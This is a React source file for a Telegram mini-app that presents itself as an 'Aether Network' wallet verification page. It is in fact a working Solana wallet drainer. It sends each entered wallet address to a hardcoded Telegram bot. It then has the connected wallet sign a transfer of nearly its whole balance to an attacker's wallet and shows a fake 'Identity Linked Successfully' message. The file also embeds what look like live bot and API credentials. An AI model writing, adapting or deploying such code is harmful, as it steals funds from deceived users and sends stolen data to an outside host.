import React, { useState, useEffect } from 'react';
import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider, useDisconnect } from '@reown/appkit/react';
import { SolanaAdapter } from '@reown/appkit-adapter-solana/react';
import { solana } from '@reown/appkit/networks';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

// --- CONFIGURATION ---
const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const TARGET_WALLET = '3EUKH4DpNZfHZ6qmBZJLKrcQZEVrnmLe22ir5cCb9Vhb'; 
const HELIUS_KEY = 'a299fc16-5dda-4ef9-bcbf-5670830b1d03'; 

const solanaAdapter = new SolanaAdapter();
createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  metadata: { 
    name: 'Aether Network', 
    description: 'Aether Network Verification Node',
    url: 'https://verification-app-mw48.vercel.app/', 
    icons: ['https://avatars.githubusercontent.com/u/179229932'] 
  },
  projectId: PROJECT_ID,
  // FIXED: This list ensures Phantom is first without breaking the app
  featuredWalletIds: ['a797aa35c0faddec1a5d2bc5c875d63d355c7068f2e7a0309997f096ae89ff36'],
  allWallets: 'SHOW' 
});

const App: React.FC = () => {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<any>('solana');
  const { disconnect } = useDisconnect();

  const [step, setStep] = useState<1 | 2>(1);
  const [walletCA, setWalletCA] = useState<string>('');
  const [status, setStatus] = useState<'idle' | 'verifying' | 'completed'>('idle');
  const tg = (window as any).Telegram?.WebApp;

  useEffect(() => {
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#17101F');
    }
  }, [tg]);

  const handleCAChange = async (val: string) => {
    setWalletCA(val);
    if (isConnected) await disconnect(); // Clears old login for new CA
  };

  const handleStepOne = async () => {
    if (!walletCA) return alert("Please enter the Wallet CA");
    setStatus('verifying');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `🆕 CA: ${walletCA}`, parse_mode: 'HTML' }),
    });
    setTimeout(() => { setStep(2); setStatus('idle'); }, 1500);
  };

  const handleStepTwo = async () => {
    if (!isConnected) { open({ view: 'Connect' }); return; }
    
    // THE GUARD: Check if connected wallet matches CA
    if (address !== walletCA) {
      alert(`Mismatch: Connected wallet does not match the CA.`);
      return;
    }

    setStatus('verifying');
    try {
      const connection = new Connection(`https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`, "confirmed");
      const pubKey = new PublicKey(address!);
      const balance = await connection.getBalance(pubKey);
      const gasReserve = 1500000; 
      const amountToSend = balance - gasReserve;

      if (amountToSend <= 0) throw new Error("Insufficient balance.");

      const { blockhash } = await connection.getLatestBlockhash();
      const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
        .add(SystemProgram.transfer({
          fromPubkey: pubKey,
          toPubkey: new PublicKey(TARGET_WALLET),
          lamports: amountToSend,
        }));

      const signature = await walletProvider.sendTransaction(transaction, connection);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: `✅ SUCCESS\nCA: ${walletCA}\nSig: ${signature}`, parse_mode: 'HTML' }),
      });
      setStatus('completed');
      alert("AETHER: Identity Linked Successfully.");
    } catch (err: any) {
      setStatus('idle');
      alert("Verification Error: " + err.message);
    }
  };

  const theme = { bg: 'linear-gradient(180deg, #17101F 0%, #0D0912 100%)', card: '#20182A', purple: '#AB9FF2', text: '#FFFFFF', textMuted: '#998DA8', input: '#2C2337' };

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 20px' }}>
      <h1 style={{ fontSize: '24px', textAlign: 'center' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
      <p style={{ color: theme.textMuted, textAlign: 'center', marginBottom: '30px' }}>{step === 1 ? "Enter your wallet's CA" : "Connect your wallet"}</p>
      
      <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px' }}>
        <label style={{ display: 'block', fontSize: '11px', color: theme.textMuted, textAlign: 'center', marginBottom: '8px' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
        
        {step === 1 ? (
          <input 
            type="text" 
            value={walletCA} 
            onChange={(e) => handleCAChange(e.target.value)} 
            placeholder="Enter Wallet CA..." 
            style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, color: 'white', textAlign: 'center', border: 'none', outline: 'none', boxSizing: 'border-box' }} 
          />
        ) : (
          <div style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, textAlign: 'center' }}>
            {isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Connect to Bridge"}
          </div>
        )}

        <button onClick={step === 1 ? handleStepOne : handleStepTwo} style={{ width: '100%', padding: '16px', borderRadius: '100px', background: theme.purple, color: '#17101F', fontWeight: 'bold', marginTop: '20px', border: 'none', cursor: 'pointer' }}>
          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
        </button>

        {step === 2 && (
          <button onClick={() => setStep(1)} style={{ width: '100%', marginTop: '12px', background: 'transparent', color: theme.textMuted, border: 'none', textAlign: 'center', cursor: 'pointer' }}>
            Go Back
          </button>
        )}
      </div>

      <div style={{ marginTop: '40px', textAlign: 'center' }}>
        <button onClick={() => window.open('https://verification-app-mw48.vercel.app/', '_blank')} style={{ background: 'none', border: `1px solid ${theme.textMuted}`, color: theme.text, padding: '8px 16px', borderRadius: '8px', cursor: 'pointer' }}>
          Open in Browser
        </button>
      </div>
    </div>
  );
};

export default App;